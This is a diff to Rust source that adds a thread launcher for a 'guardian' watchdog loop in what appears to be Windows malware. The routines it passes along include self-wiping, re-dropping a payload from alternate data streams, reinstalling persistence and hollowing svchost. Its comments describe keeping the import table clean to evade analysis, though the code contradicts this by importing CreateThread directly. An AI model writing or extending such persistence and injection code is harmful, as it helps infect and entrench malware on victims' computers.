@@ -335,3 +335,75 @@ pub unsafe fn guardian_loop(
         }
     }
 }
+
+// ── start_thread: spawn guardian_loop in a detached OS thread ─────────────
+//
+// Takes the same parameters as guardian_loop and passes them through.
+// Uses CreateThread via kernel32 resolved through the PEB export table
+// to avoid a direct import (keeps the IAT clean).
+//
+// The thread runs guardian_loop which is -> !  so it never returns.
+// We pass all function pointers as a heap-allocated context struct.
+
+use winapi::um::processthreadsapi::CreateThread as WinCreateThread;
+use winapi::um::handleapi::CloseHandle;
+
+#[repr(C)]
+struct GuardianCtx {
+    fn_wipe:      WipeSelf,
+    fn_purge:     PurgeAll,
+    fn_redrop:    DropFromAds,
+    fn_repersist: InstallAll,
+    fn_hollow:    InjectSvchost,
+    fn_tick:      GetTickCount64,
+    fn_sleep_ms:  Sleep,
+    fn_ntqsi:     NtQuerySystemInformation,
+}
+
+unsafe extern "system" fn guardian_thread_proc(param: *mut c_void) -> u32 {
+    let ctx = Box::from_raw(param as *mut GuardianCtx);
+    guardian_loop(
+        ctx.fn_wipe,
+        ctx.fn_purge,
+        ctx.fn_redrop,
+        ctx.fn_repersist,
+        ctx.fn_hollow,
+        ctx.fn_tick,
+        ctx.fn_sleep_ms,
+        ctx.fn_ntqsi,
+    );
+}
+
+pub unsafe fn start_thread(
+    fn_ntqsi:     NtQuerySystemInformation,
+    fn_sleep_ms:  Sleep,
+    fn_tick:      GetTickCount64,
+    fn_wipe:      WipeSelf,
+    fn_purge:     PurgeAll,
+    fn_redrop:    DropFromAds,
+    fn_repersist: InstallAll,
+    fn_hollow:    InjectSvchost,
+) {
+    let ctx = Box::new(GuardianCtx {
+        fn_wipe,
+        fn_purge,
+        fn_redrop,
+        fn_repersist,
+        fn_hollow,
+        fn_tick,
+        fn_sleep_ms,
+        fn_ntqsi,
+    });
+    let param = Box::into_raw(ctx) as *mut c_void;
+    let h = WinCreateThread(
+        null_mut(),
+        0,
+        Some(guardian_thread_proc),
+        param,
+        0,
+        null_mut(),
+    );
+    if !h.is_null() {
+        CloseHandle(h);
+    }
+}
